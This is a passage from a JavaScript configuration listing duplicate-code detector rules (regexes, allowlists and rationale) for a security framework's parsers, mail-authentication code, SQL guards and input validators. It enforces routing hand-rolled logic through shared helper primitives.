    reason: "10 string guards (cidr/domain/jsonpath/jwt/mime/regex/shell/template/time/uuid) hand-rolled the SAME typed bad-input + empty detector preamble — a `raw`-contract guard owns its own input check (gate-contract INPUT_CONTRACTS) — differing only in the guard name, the snippet noun (\"regex pattern\"/\"shell arg\"/\"template input\"), and the empty mode (issue / [] / skipped). Extracted b.gateContract.detectStringInput(input, { name, noun?, emptyMode? }); every string guard calls it. Allowlist is EMPTY: the primitive builds `ruleId: cfg.name + \".bad-input\"` by concatenation (no dotted literal) so the detector never trips lib/gate-contract.js; the byte cap stays per-guard (the divergent part — different byte field / kind / measure, and it must precede the codepoint scan to bound work) so this dedups only the identical preamble. The object/Buffer guards' bad-input (\"is not an object\"/\"is not a Buffer\") and the markdown/xml/yaml no-ruleId `too-large` variant are deliberately NOT matched — different shapes, separate clusters. A re-introduced hand-rolled typed string bad-input trips this — use b.gateContract.detectStringInput.",
  },
  {
    id: "guard-defaults-hand-rolled-strict-enforce",
    primitive: "b.gateContract.strictDefaults(profiles, overlay?) (lib/gate-contract.js) — a guard's DEFAULTS = its strict profile in enforce mode (+ optional overlay). Hand-rolling `Object.freeze(Object.assign({}, PROFILES[\"strict\"], { mode: \"enforce\"[, …] }))` re-spells it; call b.gateContract.strictDefaults(PROFILES[, { maxRuntimeMs: … }]).",
    // Loose on purpose: catches the strict-profile-overlay construction whether
    // PROFILES["strict"] (bracket) OR PROFILES.strict (dot — guard-sql), and
    // regardless of the overlay's first key. A tight `…["strict"], { mode:` form
    // missed guard-sql (dot-notation) — exactly the fp-member-list-is-a-seed trap.
    regex: /DEFAULTS\s*=\s*(?:Object\.freeze\(\s*)?Object\.assign\(\s*\{\s*\}\s*,\s*PROFILES(?:\[\s*["']strict["']\s*\]|\.strict)\s*,/,
    skipCommentLines: true,
    allowlist: [],
    reason: "25 guards hand-rolled `DEFAULTS = Object.freeze(Object.assign({}, PROFILES.strict | [\"strict\"], { mode: \"enforce\"[, maxRuntimeMs / contextMode / … ] }))` — the guard's default opts = strictest profile + enforcement on (security-on by default), the only variation a per-guard overlay. (csv/text express the SAME thing as an inline literal that re-lists every strict key — a drift risk — and also route through the primitive.) Extracted b.gateContract.strictDefaults(profiles, overlay?). Allowlist is EMPTY: the primitive uses a lowercase `profiles.strict`, so this UPPERCASE-`PROFILES` detector never trips lib/gate-contract.js. Loosened to bracket-OR-dot after a tight regex missed guard-sql's `PROFILES.strict` — but KEPT the `DEFAULTS =` semantic anchor: dropping it over-matched guard-sql's `COMPLIANCE_POSTURES` (`Object.assign({}, PROFILES.strict, { gdprRedact:true })` — the legit all-strict posture, a DIFFERENT op). Loosen incidental anchors (notation / overlay-first-key), keep the one that identifies THE op. Re-introduced hand-rolled strict-default trips this — use b.gateContract.strictDefaults.",
  },
  {
    id: "dkim-relaxed-header-canon-hand-rolled",
    primitive: "dkim.canonHeaderRelaxed(name, value) (lib/mail-dkim.js) — the RFC 6376 §3.4.2 relaxed header canonicalization (lowercase name, unfold continuations, collapse internal WSP, strip trailing WSP, append CRLF) shared by the DKIM signer/verifier, the ARC signer, and the DMARC/ARC verifier so every path reaches a byte-identical canon (RFC 8617 §5.1.1). Hand-rolling `name.toLowerCase() + \":\" + value.replace(/\\r?\\n[ \\t]+/g,\" \").replace(...) + \"\\r\\n\"` re-spells it; call dkim.canonHeaderRelaxed(name, value).",
    // Anchors on the canon return shape `toLowerCase() + \":\" + <trimmed> + \"\\r\\n\"`
    // — the lowercased-name-colon-value-CRLF header line that only the relaxed
    // canon produces. The algorithm lives in lib/mail-dkim.js (allowlist); the ARC
    // signer + DMARC/ARC verifier route through dkim.canonHeaderRelaxed.
    regex: /toLowerCase\(\)\s*\+\s*":"\s*\+\s*\w+\s*\+\s*"\\r\\n"/,
    skipCommentLines: true,
    allowlist: ["lib/mail-dkim.js"],
    reason: "The RFC 6376 §3.4.2 relaxed header canonicalization was byte-identical across lib/mail-dkim.js (_canonHeaderRelaxed), lib/mail-arc-sign.js and lib/mail-auth.js (_canonRelaxedHeader) — a SIGNATURE-CRITICAL algorithm (a diverged unfold/WSP-collapse silently breaks DKIM/ARC verification) that had even been reward-hack-allowlisted with `// allow:duplicate-regex` markers instead of extracted. The body canon was already shared via mail-dkim; only the header canon stayed duplicated. Extracted dkim.canonHeaderRelaxed(name, value) (mail-dkim is the canonicalization owner; arc-sign + mail-auth already require it); routed both, removed the allow-markers (byte-parity proven — same function). Allowlist names lib/mail-dkim.js ONLY (the algorithm's home). A re-introduced hand-rolled relaxed header canon trips this — use dkim.canonHeaderRelaxed.",
  },
  {
    id: "split-unquoted-hand-rolled",
    primitive: "b.structuredFields.splitUnquoted(s, sep) (lib/structured-fields.js) — split a string on every `sep` outside a `\"...\"` run, with NO backslash escaping (the iCalendar / vCard QSAFE-CHAR variant, distinct from splitTopLevel's HTTP `\\\"` escaping). Hand-rolling `var inQ = false; … if (c === '\"') { inQ = !inQ; continue; } if (c === sep && !inQ) { out.push(s.slice(start, i)); start = i + 1; }` re-spells it; call structuredFields.splitUnquoted(s, sep).",
    // Anchors on the single-quoted double-quote literal `=== '\"') { <flag> =
    // !<flag>; continue` toggle — distinct from safe-ini's `=== \"\\\"\" &&
    // !inSingle` dual-quote-with-escape comment stripper (which writes the quote
    // as a double-quoted escape, not the `'\"'` literal). The splitter lives only
    // in lib/structured-fields.js (the allowlist entry).
    regex: /===\s*'"'\s*\)\s*\{\s*(\w+)\s*=\s*!\1;\s*continue/,
    skipCommentLines: true,
    allowlist: ["lib/structured-fields.js"],
    reason: "The iCal/vCard quote-aware value splitter `_splitUnquoted(s, sep)` (toggle inQ on a `\"`, split on `sep` outside the quoted run, no backslash escaping) was byte-identical in lib/safe-ical.js and lib/safe-vcard.js — a 15-line parser duplicated across the two RFC line-protocol guards, riding inside a 3-file coincidental STRONG-DUP cluster a blanket allowlist would have masked. Extracted b.structuredFields.splitUnquoted(s, sep) (its quote-aware home, sibling of splitTopLevel) and routed both; kept SEPARATE from splitTopLevel because that honours HTTP structured-field `\\\"` escapes while iCal/vCard (RFC 5545 §3.1.1 / RFC 6350 §3.3) forbid an escaped DQUOTE, so the two are NOT interchangeable. Allowlist names lib/structured-fields.js ONLY. A re-introduced hand-rolled unquoted splitter trips this — use structuredFields.splitUnquoted.",
  },
  {
    id: "strip-double-quotes-hand-rolled",
    primitive: "b.structuredFields.stripDoubleQuotes(s) (lib/structured-fields.js) — strip one layer of surrounding `\"` when both ends are a double quote, no escape processing. Hand-rolling `if (s.length >= 2 && s.charAt(0) === '\"' && s.charAt(s.length - 1) === '\"') return s.slice(1, -1)` re-spells it; call structuredFields.stripDoubleQuotes(s).",
    // Anchors the both-ends-double-quote test `.charAt(0) === '\"' && X.charAt(
    // X.length - 1) === '\"'`. The home (structured-fields.js) is the sole
    // allowlist entry.
    regex: /\.charAt\(0\)\s*===\s*'"'\s*&&\s*\w+\.charAt\(\s*\w+\.length\s*-\s*1\s*\)\s*===\s*'"'/,
    skipCommentLines: true,
    allowlist: [
      "lib/structured-fields.js",
      // The plain-strip callers (safe-ical / safe-vcard / auth/step-up /
      // cookies) now route through stripDoubleQuotes. The four below keep the
      // inline test because they do MORE than a plain strip, which stripDouble
      // Quotes does not: they unescape inside the quoted span (http-client-cache
      // — single-pass RFC 8941; middleware/scim-server — `\"`→`"`; safe-mime —
      // `\X`→`X`), or they omit the length>=2 guard and the strip is embedded in
      // a larger branch (guard-mime — a single `"` is treated differently).
      // Routing any of them would change behaviour.
      "lib/guard-mime.js",
      "lib/http-client-cache.js",
      "lib/middleware/scim-server.js",
      "lib/safe-mime.js",
    ],
    reason: "safe-ical._stripDoubleQuotes and safe-vcard._stripDoubleQuotes were byte-identical (the plain DQUOTE unwrap for an iCal/vCard quoted parameter value — no backslash escaping, distinct from unquoteSfString's HTTP structured-field escape decoding), riding inside a 3-file coincidental cluster (cache-status._parseParamValue) a blanket allowlist would have masked. Extracted b.structuredFields.stripDoubleQuotes(s) (sibling of splitUnquoted) and routed the four PLAIN-strip callers (safe-ical / safe-vcard / auth/step-up / cookies). Four strip-and-UNESCAPE / no-length-guard callers (guard-mime / http-client-cache / scim-server / safe-mime) keep the inline test — they do more than the plain strip, so stripDoubleQuotes can't host them. A re-introduced plain surrounding-quote strip trips this — use structuredFields.stripDoubleQuotes.",
  },
  {
    id: "raw-sql-string-literal-scan-hand-rolled",
    primitive: "b.safeSql.assertNoRawStringLiteral(sql, where, makeError?) (lib/safe-sql.js) — the one quote/comment-aware scan that refuses a `'...'` string literal in raw SQL (skips `\"...\"` identifiers with doubled-quote escapes, `--` line and `/* */` block comments, throws the caller's error on the first top-level `'`). Hand-rolling the `while (i < len) { … if (charAt(i+1) === '\"') { i += 2; continue } … if (ch === \"'\") throw … }` byte-walker re-spells it; call safeSql.assertNoRawStringLiteral(sql, where[, makeError]).",
    // Anchors on the identifier-quote escape skip `=== '\"') { X += 2; continue`
    // (assertSingleStatement uses `=== qch`, so it does NOT match) followed by the
    // single-quote handling `ch === \"'\"` within the same walker. The shared scanner
    // lives only in lib/safe-sql.js (the allowlist entry); b.sql and external-db's
    // raw gate route through it. {0,320} is a ReDoS backstop, not the precision.
    regex: /===\s*'"'\s*\)\s*\{\s*[a-z]\w*\s*\+=\s*2;\s*continue[\s\S]{0,700}?ch\s*===\s*"'"/,
    skipCommentLines: true,
    allowlist: ["lib/safe-sql.js"],
    reason: "The quote/comment-aware raw-SQL string-literal scanner was byte-identical (modulo the thrown error) in lib/sql.js (_assertRawNoStringLiteral, the b.sql builder's raw-fragment gate) and lib/db-query.js (_assertRawNoStringLiteral, the external-db raw-query gate) — a 28-line injection-defense walker duplicated across the structured builder and the raw path, where a fix to one would silently not reach the other. It surfaced inside a 3-file coincidental STRONG-DUP cluster that a blanket allowlist would have masked. Extracted b.safeSql.assertNoRawStringLiteral(sql, where, makeError?); the scanner is shared, the error stays per-caller (db-query keeps SafeSqlError \"sql/raw-literal\" via the default; sql.js keeps its \"sql-builder/raw-literal\" via a makeError closure — byte-parity proven). Allowlist names lib/safe-sql.js ONLY (the scanner's home). A re-introduced hand-rolled raw-SQL literal scanner trips this — use safeSql.assertNoRawStringLiteral.",
  },
  {
    id: "sql-positional-conversion-hand-rolled",
    primitive: "b.safeSql.toPositional(sql, dialect) (lib/safe-sql.js) — the one quote/comment/backtick-aware scan that rewrites bound `?` placeholders to Postgres `$N`. Hand-rolling the `if (ch === \"?\") { n += 1; out += \"$\" + n; … }` build re-spells it; call safeSql.toPositional(sql, dialect).",
    // Anchors on the positional-placeholder emit `+= \"$\" + <var>` — the
    // distinctive step that distinguishes the ?→$N REWRITE from the sibling
    // count/assert scanners (countPlaceholders counts, assert* throws; none
    // emit a "$N"). The scanner's home is lib/safe-sql.js; b.sql's _toPositional
    // and b.clusterStorage.placeholderize both compose it.
    regex: /\+=\s*"\$"\s*\+\s*\w+/,
    allowlist: ["lib/safe-sql.js"],
    reason: "lib/sql.js (_toPositional, the b.sql builder's driver-final ?→$N translator) and lib/cluster-storage.js (placeholderize, b.clusterStorage's cross-dialect rewrite) hand-rolled a BYTE-IDENTICAL 30-line quote/comment/backtick-aware Postgres positional converter — the genuine dup that hid inside the SQL char-walk cluster a prior allowlist mislabeled \"no two bodies are byte-identical\". Extracted b.safeSql.toPositional(sql, dialect) (byte-parity proven across quote/comment/backtick/doubled-quote inputs over postgres/sqlite/mysql); sql._toPositional is now an alias and clusterStorage.placeholderize delegates. Allowlist names lib/safe-sql.js ONLY (the converter's home). A re-introduced hand-rolled ?→$N build trips this — use safeSql.toPositional.",
  },
  {
    id: "byte-cap-measured-with-char-length",
    primitive: "b.safeBuffer.byteLengthOf(value) for a byte-named cap — measures Buffer.byteLength for a string and `.length` for a Buffer/Uint8Array, so a cap named in BYTES is enforced the same way whether the value arrived decoded or raw. `value.length` on a STRING counts UTF-16 code units, so comparing it to a *Bytes cap (maxBytes / maxLineBytes / maxUsernameBytes / maxBodyBytes / maxPayloadBytes / maxResultBytes / …) under-enforces on multibyte input. Route the comparison through safeBuffer.byteLengthOf, not `value.length > someBytesCap`.",
    // Broadened from the original `opts.<...>Bytes`-only form, which missed two
    // whole families: (1) `*Bytes`-named caps off any receiver — `caps.maxLineBytes`
    // (imap/pop3/managesieve command guards), `args.maxBodyBytes`, `ctx.maxBodyBytes`,
    // bare `maxBytes`; and (2) the `C.BYTES.<unit>(N)` generator caps (bytes / kib /
    // mib / gib) — acme identifier/profile/CSR-domain, external-db tenant value,
    // graphql/mcp bearer headers, network-tls path check, sigv4 object key, redact
    // value. Match a `<x>.length > <byteCap>` comparison for ANY receiver where the
    // cap is `*Bytes`-named OR a `C.BYTES.<unit>(` call; routed sites use
    // `safeBuffer.byteLengthOf(x) > cap` (no `.length`) so they never trip.
    regex: /[a-zA-Z_$][\w$.[\]]*\.length\s*>\s*(?:[\w$.[\]]*[Bb]ytes\b|C\.BYTES\.\w+\s*\()/,
    skipCommentLines: true,
    allowlist: ["lib/safe-buffer.js", "lib/static.js"],
    reason: "A byte-named cap compared against a STRING's `.length` (UTF-16 code units) under-enforces the byte limit on multibyte input: a 2-4-byte character counts as 1, so the real byte ceiling is up to ~4x the configured limit (a looser DoS bound than the operator set), and the error mislabels the char count as 'N bytes'. The original detector only matched `opts.<...>Bytes`, so a family of `caps.maxLineBytes` / bare-`maxBytes` string comparisons slipped through (imap/managesieve/pop3 command-line caps, pop3 USER/PASS caps, mail-arf / dmarc-ruf report caps, mail-store body cap, inbox metadata cap, safe-jsonpath key/expression caps, sandbox input + result caps). Fixed framework-wide by routing every string byte-cap comparison through safeBuffer.byteLengthOf and keeping a behavioral test per consumer path (the primary guard; this detector is the secondary tripwire). Buffer/byte-array sites were routed through the same primitive (parity — a Buffer's `.length` IS bytes). Allowlist is STRUCTURAL and minimal: lib/safe-buffer.js is the primitive's own home (its toBuffer / boundedChunkCollector cap a freshly-built Buffer), and lib/static.js compares a parsed Range descriptor's numeric `.length` (a precomputed byte count, not a String/Buffer length). A re-introduced `value.length > someBytesCap` trips this — use safeBuffer.byteLengthOf(value).",
  },
  {
    id: "compliance-postures-hand-rolled-forensic-map",
    primitive: "b.gateContract.compliancePostures(profiles, { base, overlays? }) (lib/gate-contract.js) — builds the four-posture forensic COMPLIANCE_POSTURES map (hipaa/pci-dss/soc2 → strict, gdpr → balanced; forensic snippet base / base÷2 / base×2, + optional per-posture overlay). Hand-rolling the map as a `COMPLIANCE_POSTURES = Object.freeze({ … forensicSnippetBytes … })` literal — whether each posture is `Object.assign({}, PROFILES[tier], { forensicSnippetBytes })` OR a partial inline object that silently backfills from the strict DEFAULTS — re-spells (and rots) that policy; build it once with b.gateContract.compliancePostures(PROFILES, { base: N[, overlays ] }).",
    // Fires on any hand-rolled FORENSIC posture literal: the Object.freeze map
    // anchor + a forensicSnippetBytes key reached without crossing the block's
    // own `\n});` close (§3 structural-boundary temper; the {0,4000} is a ReDoS
    // backstop far above any real block, never the precision mechanism). Catches
    // BOTH the Object.assign-overlay shape (21 simple guards) AND the partial-
    // inline shape that drove the html/svg/filename gdpr drift. Does NOT match
    // the non-forensic posture maps (guard-sql all-strict + gdprRedact, ai-
    // content-detect regulation→profile-name) — they carry no forensicSnippetBytes.
    regex: /COMPLIANCE_POSTURES\s*=\s*Object\.freeze\(\{(?:(?!\n\}\);)[\s\S]){0,4000}?forensicSnippetBytes/,
    skipCommentLines: true,
    allowlist: [],
    reason: "26 content guards each hand-rolled a four-posture forensic COMPLIANCE_POSTURES map — the framework's regulation-disposition policy (hipaa/pci-dss/soc2 → strict + base, gdpr → balanced + base÷2, soc2 → strict + base×2), duplicated. 5 of them (html/svg/filename/csv/text) wrote PARTIAL inline posture objects whose omitted keys silently backfilled gdpr from the strict DEFAULTS → an incoherent strict/balanced hybrid (the bug class). Extracted b.gateContract.compliancePostures(profiles, { base, overlays? }); every forensic guard routes through it (filename keeps a gdpr { bidiPolicy/controlPolicy: strip } overlay; csv a per-posture { piiPolicy: redact } overlay; the rest pass base only). The detector matches the hand-rolled FORENSIC literal in EITHER shape (Object.assign overlay or partial inline) by anchoring the Object.freeze map + a forensicSnippetBytes key within the block — the discovery: a narrow Object.assign-only regex would have let a re-introduced partial-inline posture rot exactly as html/svg/filename did. Allowlist is EMPTY: routed guards use `= gateContract.compliancePostures(…)` (no Object.freeze literal); the non-forensic posture maps (guard-sql, ai-content-detect) carry no forensicSnippetBytes so never match; lib/gate-contract.js has no COMPLIANCE_POSTURES literal. Use b.gateContract.compliancePostures.",
  },
  {
    id: "kv-piece-extract-hand-rolled",
    primitive: "b.structuredFields.parseKeyValuePiece(piece, kvSep?, lowerKey?) / parseKeyValuePieces(pieces, startIndex?, kvSep?, lowerKey?) / parseTagList(input, opts?) (lib/structured-fields.js) — the key=value piece-parser family. The key-extraction atom `X.slice(0, sep).trim().toLowerCase()` (key = text before the first separator, trimmed + lower-cased; value = the raw remainder) is the shared step behind EVERY delimited-list parser: naive `;`/`=` tag lists (DKIM/DMARC/ARC/BIMI/TLS-RPT/MTA-STS), quote-aware splitTopLevel+per-piece parsers (Cache-Control directives, Client-Hints brand params, Content-Type params), `:`-keyed header-line blocks (ARC re-canonicalization, multipart part headers, WS handshake headers), and one-shot separator-classified values (DSN address type, MDN disposition mode, Repr-Digest algorithm). Hand-rolling `eq = X.indexOf(sep); key = X.slice(0, eq).trim().toLowerCase(); value = X.slice(eq + 1)` re-spells the atom; call parseKeyValuePiece for one piece, parseKeyValuePieces for a pre-split list (it owns the iterate-trim-skip spine), or parseTagList for a bare-split `key=value` list returning [key, value] pairs.",
    // Anchors on the key-extraction atom `.slice(0, <var>).trim().toLowerCase()`
    // in either chain order (`.toLowerCase().trim()` too). This is the exact
    // lexical signature the family owns. The primitive never uses the literal —
    // it computes the key as `(at === -1 ? piece : piece.slice(0, at)).trim()`
    // (a `)` sits between the slice and `.trim`) then conditionally `.toLowerCase`
    // on a separate expression — so it never trips. ZERO allowlist: every shipped
    // key=value extraction is routed through the family, so any re-introduced
    // hand-rolled key slice fires this regardless of surrounding loop shape.
    regex: /\.slice\(\s*0\s*,\s*\w+\s*\)\.(?:trim\(\)\.toLowerCase|toLowerCase\(\)\.trim)\(\)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "~19 sites across the framework hand-rolled the same `X.slice(0, sep).trim().toLowerCase()` key extraction, varying only in separator, bare-item handling (skip / throw / flag), and per-value dispatch: the quote-aware Cache-Control / Client-Hints / Content-Type parsers (splitTopLevel + per-piece), the bare-split DKIM / DMARC / ARC / BIMI / TLS-RPT / MTA-STS tag lists, the `=`-kv param loops (ai-pref Content-Usage, auth/step-up WWW-Authenticate, body-parser Content-Type / Content-Disposition), the `:`-keyed header-line blocks (mail-auth ARC re-canonicalization ×3, ws-client handshake, body-parser multipart part headers), and one-shot separator splits (guard-dsn address type, mail-mdn disposition mode, tus-upload Repr-Digest algorithm, content-digest dictionary member, http-message-signature digest member). Extracted into one family: parseKeyValuePiece(piece, kvSep?, lowerKey?) → { key, value } (value null when the piece is bare); parseKeyValuePieces(pieces, startIndex?, kvSep?, lowerKey?) → the iterate-trim-skip-parse spine; parseTagList(input, opts?) → ordered [key, value] pairs for naive bare-split grammars, now itself built on parseKeyValuePieces. Each caller keeps its own split discipline (bare split vs splitTopLevel vs _splitWwwAuth), bare-item handling, and dispatch; the family owns only the extraction. Byte-parity proven (125-case atom harness across 5 separators × 25 adversarial inputs + per-shape parity). ZERO allowlist — a re-introduced key slice trips this; use parseKeyValuePiece / parseKeyValuePieces / parseTagList.",
  },
  {
    // v0.15.13 — the consumer-side sibling of kv-piece-extract: every header
    // parser that called parseKeyValuePieces then hand-rolled the same iterate-
    // skip-bare-trim loop before dispatching → b.structuredFields.forEachKeyValue.
    id: "kv-piece-consume-loop-hand-rolled",
    primitive: "b.structuredFields.forEachKeyValue(kvps, handler) (lib/structured-fields.js) — consume the { key, value } records from parseKeyValuePieces: skip the bare entries (null value), trim each surviving value, and call handler(key, trimmedValue, index). Hand-rolling `for (var i = 0; i < kvps.length; i++) { if (kvps[i].value === null) continue; var k = kvps[i].key; var v = kvps[i].value.trim(); <dispatch> }` re-spells the iterate-skip-bare-trim spine; call forEachKeyValue and put the dispatch in the handler (a handler `return` skips the entry, like `continue`).",
    // Anchors on the INDEXED skip-bare + trim pair `X[i].value === null) continue;
    // … X[i].value.trim()` (backref = same array var). Parsers that treat a bare
    // key as meaningful use `kvp.value === null) { … }` on a per-iteration alias
    // (cdn-cache-control, client-hints) — NOT the indexed immediate-continue form —
    // so they don't match. mail-auth iterates single parseKeyValuePiece results
    // (`khv.value`, not `khv[i].value`) and is likewise excluded. Allowlist =
    // structured-fields.js: the primitive's own body is this exact loop, and it is
    // the family home.
    regex: /(\w+)\[\w+\]\.value === null\)\s*continue;[\s\S]{0,180}?\1\[\w+\]\.value\.trim\(\)/,
    skipCommentLines: true,
    allowlist: ["lib/structured-fields.js"],
    reason: "6 header parsers (ai-pref.parseHeader / auth/step-up.parseChallenge / safe-mime._parseContentType / middleware/body-parser ×2 / ws-client + parseTagList itself) each hand-rolled the SAME consumer loop after parseKeyValuePieces — `for (i…kvps.length) { if (kvps[i].value === null) continue; <key>; <value>.trim(); <dispatch> }` — the iterate-skip-bare-trim spine that mirrors parseKeyValuePieces on the consuming side. Extracted b.structuredFields.forEachKeyValue(kvps, handler) which owns skip-bare + trim + index; each caller's per-key dispatch (sf-string unquote, numeric coercion, poisoned-key drop, typed-result build) moves into the handler (a `return` skips, like `continue`). Parsers that treat a value-less key as meaningful (cdn-cache-control directives, client-hints brand params — they set a bare/true and keep going) correctly do NOT route and do NOT match (alias-not-indexed form). Allowlist = structured-fields.js only: forEachKeyValue's own body IS the loop, and parseTagList (same module) now calls it. A re-introduced hand-rolled indexed skip-bare-trim consumer loop trips this — use b.structuredFields.forEachKeyValue.",
  },
  {
    id: "markup-tokenizer-scan-hand-rolled",
    primitive: "b.internal markupTokenizer.scanToTagEnd(s, from, len) / splitTagNameAttrs(inner, tagNameRe) (lib/markup-tokenizer.js) — the two quote-aware steps shared by the markup sanitizers (guard-html, guard-svg) and the BIMI SVG Tiny PS validator (mail-bimi). scanToTagEnd walks from the byte after `<` to the closing `>`, treating a `>` inside a single/double-quoted attribute value as a literal (the bypass an attribute-injection hides in); splitTagNameAttrs splits a tag's inner text into the lower-cased tagName + raw attrSrc per the caller's name grammar. Hand-rolling the `while (…) { if (inQuote) { … } else { if (ch === '\"' || ch === \"'\") inQuote = ch; else if (ch === '>') break; } }` scan, or the `nameMatch = inner.match(re); tagName = nameMatch ? nameMatch[1].toLowerCase() : ''` extraction, re-spells them; call the helpers and keep your own declaration-dispatch + unterminated policy.",
    // Anchors on the quote-open assignment `ch === '\"' || ch === \"'\") inQuote = ch`
    // (the distinctive line of the scan) OR the `nameMatch ? nameMatch[1].toLowerCase()`
    // tag-name extraction. Both are exact lexical signatures of the two helpers.
    // markup-tokenizer.js is the home (both idioms live in the primitive bodies),
    // so it is the sole allowlist entry; every consumer routes through the helpers.
    regex: /ch\s*===\s*'"'\s*\|\|\s*ch\s*===\s*"'"\s*\)\s*inQuote\s*=\s*ch|nameMatch\s*\?\s*nameMatch\[1\]\.toLowerCase\(\)/,
    skipCommentLines: true,
    allowlist: ["lib/markup-tokenizer.js"],
    reason: "guard-html._tokenize, guard-svg._tokenize, and mail-bimi._tokenizeTinyPsSvg each carried a byte-identical quote-aware start-tag scan + tag-name/attr extraction, but their tokenizers genuinely diverge elsewhere — guard-html/guard-svg recover leniently from a truncated tag while the BIMI validator fails closed (throws), and each recognizes a different declaration vocabulary (`<?`, `<!ENTITY>`, balanced `<!DOCTYPE [...]>`) + tag-name charset (`_` in the XML family). Folding the whole tokenizer into one options-laden function would mold those security postures together, so only the two zero-/single-axis atoms are extracted: scanToTagEnd (no variation) and splitTagNameAttrs (tagNameRe as a strategy param). Each tokenizer keeps its own loop, declaration dispatch, unterminated policy, offsets, and byte-cap. scanToTagEnd byte-parity proven across quoted-`>` / nested-quote / unterminated / self-closing inputs; the three sanitizer test suites pass unchanged. allowlist is markup-tokenizer.js only (the primitive home); a re-introduced quote-aware tag scan or tag-name extraction trips this — use the helpers.",
  },
  {
    id: "control-char-check-hand-rolled",
    primitive: "b.codepointClass.isForbiddenControlChar(code, { allowLf?, allowCr?, forbidTab? }) / firstControlCharOffset(s, opts) (lib/codepoint-class.js) — the RFC 5322 / header-injection control-byte predicate: DEL (0x7f) and any C0 control (< 0x20); TAB (0x09) permitted as folding whitespace by default and forbidden with `{ forbidTab: true }`; LF/CR refused by default, permitted with allowLf/allowCr. Hand-rolling `c === 0x00 || c === 0x7f || (c < 0x20 && c !== 0x09)` (allow-TAB) OR `c < 0x20 || c === 0x7f` (forbid-TAB) — a per-char loop returning bool / throwing with the char code+offset / counting — re-spells it; call codepointClass.firstControlCharOffset(s[, {forbidTab,allowLf,allowCr}]) (or isForbiddenControlChar(c, …) inside an existing scanner, keeping any interleaved slash / quote / backslash / non-ASCII check beside it) and wrap as bool / throw / strip.",
    // Anchors on the control-byte tell — `< 0x20` (or `< 32`) within one
    // expression of EITHER the TAB-exemption `!== 0x09` (allow-TAB form) OR a
    // DEL compare `=== 0x7f` / `=== 127` (forbid-TAB form). The tempered
    // [^;{}\n] class can't cross a statement boundary; {0,40} is a ReDoS
    // backstop, not the precision mechanism. The primitive uses the positive
    // forms `code === 0x7f` then `code >= 0x20` (DEL compared BEFORE any
    // `< 0x20`), so it never trips lib/codepoint-class.js.
    regex: /<\s*(?:0x20|32)\b[^;{}\n]{0,40}?(?:!==?\s*0x09|===?\s*(?:0x7[fF]|127))/,
    skipCommentLines: true,
    allowlist: ["lib/safe-sieve.js", "lib/parsers/safe-xml.js"],
    reason: "~27 parsers / guards / validators hand-rolled the same control-byte refusal loop in TWO predicate variants. ALLOW-TAB (`c < 0x20 && c !== 0x09` ... / `c === 0 || (c < 32 && c !== 9) || c === 127`, RFC 5322 header / folding contexts): the mail guards (guard-dsn / guard-imap-command / guard-pop3-command / guard-managesieve-command / guard-list-id / guard-list-unsubscribe / guard-mail-compose), the text parsers (safe-ical / safe-mime / safe-vcard / parsers/safe-toml), ai-input, inbox._rejectControlChars, safe-jsonpath. FORBID-TAB (`c < 0x20 || c === 0x7f`, identifier / key / name / single-line-value contexts where TAB is not folding whitespace): auth/step-up._quote, middleware/bearer-auth realm, guard-idempotency-key / guard-mail-move / guard-message-id / guard-mail-sieve / guard-agent-registry / guard-event-bus-topic / guard-tenant-id / guard-saga-config / guard-posture-chain name checks, guard-jwt kid, guard-smtp-command, guard-sql identifier, mail-spam-score reasons, mail.feedbackId, mail-deploy (domain / jmap-url / email), mail-rbl zone (ASCII-only), mail-server-imap mailbox name, request-helpers bearer token, safe-redirect, external-db relation, storage assemblyId, structured-fields.refuseControlBytes. They varied only in the allow-set (TAB via forbidTab; LF/CR via allowLf/allowCr; LF conditionally via caps.allowBareLf), the disposition (bool / throw-with-char-code+offset / return-message / count / strip), and interleaved non-control checks (slash / backslash / quote / non-ASCII cc > 0x7e). Extracted codepointClass.isForbiddenControlChar(code, { forbidTab, allowLf, allowCr }) + firstControlCharOffset(s, opts) (forbidTab byte-equivalent to `code < 0x20 || code === 0x7f`, proven over every codepoint); clean loops route through firstControlCharOffset, interleaved scanners use the predicate inline keeping their extra checks. Allowlist is STRUCTURAL — safe-sieve splits the C0 vs DEL refusal into two DISTINCT error messages (the combined predicate can't reproduce both), and parsers/safe-xml checks a resolved numeric char reference for C0-OR-SURROGATE (0xD800-0xDFFF) with NO DEL — a different predicate/op. A re-introduced hand-rolled `< 0x20 ... !== 0x09` or `< 0x20 ... === 0x7f` control-byte check trips this — use codepointClass.firstControlCharOffset / isForbiddenControlChar.",
  },
  {
    id: "severity-gate-disposition-hand-rolled",
    primitive: "b.gateContract.severityDisposition(issues) (lib/gate-contract.js) — the non-sanitizing guard gate's serve / audit-only / refuse action-chain (serve when no findings, audit-only when nothing reaches critical|high severity, else refuse). Hand-rolling `if (rv.issues.length === 0) return { ok: true, action: \"serve\" }; … some(i => i.severity === \"critical\") … action: \"audit-only\" … action: \"refuse\"` re-spells it; end the guard's gate check with `return gateContract.severityDisposition(rv.issues);` (the sibling of buildContentGate, which adds the sanitize attempt).",
    // Anchors on the gate-tail shape: `.issues.length === 0` (a property access
    // on a validate RESULT) … audit-only … refuse, within the windows of one
    // gate body. The primitive takes the issues array DIRECTLY (bare `issues.length`,
    // no `.issues` property access) and defineGuard's defaultGate calls it, so this
    // detector never trips lib/gate-contract.js. The {0,260}/{0,120} are ReDoS
    // backstops over a fixed ~8-line tail, not the precision mechanism.
    regex: /\.issues\.length\s*===\s*0[\s\S]{0,260}?action:\s*"audit-only"[\s\S]{0,120}?action:\s*"refuse"/,
    skipCommentLines: true,
    allowlist: [],
    reason: "8 non-sanitizing guards (guard-auth / guard-email / guard-graphql / guard-image / guard-oauth / guard-pdf / guard-regex custom gates + guard-archive's entry gate) AND defineGuard's defaultGate each hand-rolled the identical serve→audit-only→refuse severity action-chain — differing only in subject extraction + the validate call (which stay per-guard) — while gate-contract already owned the sanitize-capable sibling buildContentGate. The HEAD v0.15.0 #103 family-subset entry lumped this uniform gate tail in with the genuinely-distinct _detectIssues grammars; it is NOT distinct. Extracted b.gateContract.severityDisposition(issues) (critical|high → refuse, lower → audit-only, none → serve; byte-parity proven incl. archive's combined `some(critical||high)` form); every gate ends with `return severityDisposition(rv.issues)`. Allowlist is EMPTY: severityDisposition takes the issues array directly (bare `issues.length`, no `.issues` property-access the detector requires), and defaultGate calls it, so lib/gate-contract.js never trips. buildContentGate's per-issue disposition + sanitize chain is a DIFFERENT shape (no `.issues.length === 0 → audit-only/refuse` tail). A re-introduced hand-rolled severity gate tail trips this — use 